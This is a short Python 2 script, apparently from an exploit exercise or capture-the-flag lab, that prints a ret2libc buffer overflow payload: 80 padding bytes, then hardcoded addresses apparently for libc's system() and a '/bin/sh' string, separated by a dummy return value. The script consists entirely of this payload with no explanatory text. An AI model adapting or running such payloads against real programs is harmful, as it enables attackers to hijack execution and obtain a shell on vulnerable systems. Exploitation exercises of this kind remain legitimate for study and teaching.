import struct
padding="A"*(80)
sysAddr=struct.pack("I", 0xf7e2b2e0)
randReturn="AAAA"
bashAddr=struct.pack("I", 0xf7f6c0af)
breakpoint="\xCC"*4
print padding+sysAddr+randReturn+bashAddr